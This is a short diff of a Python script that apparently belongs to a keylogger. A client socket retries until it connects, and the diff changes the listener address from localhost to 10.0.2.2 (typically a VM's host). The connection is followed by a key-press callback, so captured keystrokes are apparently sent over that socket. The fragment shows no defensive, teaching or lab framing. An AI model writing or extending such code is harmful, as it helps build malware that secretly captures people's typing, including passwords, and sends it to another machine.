@@ -29,7 +29,7 @@ connected = False
 while not connected:
     clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:  
-        clientSocket.connect(("127.0.0.1",9090))
+        clientSocket.connect(("10.0.2.2",9090))
         connected = True  
 
         def on_press(key):
